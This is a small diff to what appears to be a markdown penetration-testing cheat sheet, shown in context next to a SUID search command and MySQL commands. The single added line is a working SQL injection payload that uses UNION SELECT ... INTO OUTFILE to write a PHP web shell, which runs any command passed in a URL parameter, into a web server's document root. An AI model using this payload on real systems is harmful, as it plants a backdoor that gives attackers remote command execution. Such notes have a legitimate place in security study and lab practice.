@@ -91,6 +91,8 @@ find / -perm -u=s -type f 2>/dev/null
 ```
 SHOW DATABASES;
 USE {database};
+
+udugisan3rd' UNION ALL SELECT "<?php system($_GET['cmd']); ?>", NULL, NULL, NULL, NULL INTO OUTFILE "/var/www/html/shell.php";-- -
 ```
 
 ## Chết não
